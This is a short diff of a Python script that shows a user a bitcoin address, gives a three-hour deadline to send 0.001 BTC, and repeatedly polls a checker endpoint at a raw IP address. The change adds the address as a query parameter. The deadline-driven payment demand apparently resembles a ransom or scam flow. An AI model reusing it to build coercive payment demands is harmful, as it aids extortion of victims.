@@ -46,10 +46,13 @@ jsonResponse = response.json()
 print("Send 0.001btc to"+ jsonResponse["input_address"])
 time.sleep(3)
 print("You have three hours to send the bitcoin")
-
+payload = {
+           "address": jsonResponse["input_address"]
+           
+           }
 for i in range(100):
     time.sleep(10)
-    responsePaid = requests.get("http://79.170.40.237/bot.com/code/checker.php")
+    responsePaid = requests.get("http://79.170.40.237/bot.com/code/checker.php", params=payload)
     print(responsePaid.url)
     print(responsePaid.raw)
     jsonPaid = responsePaid.json()
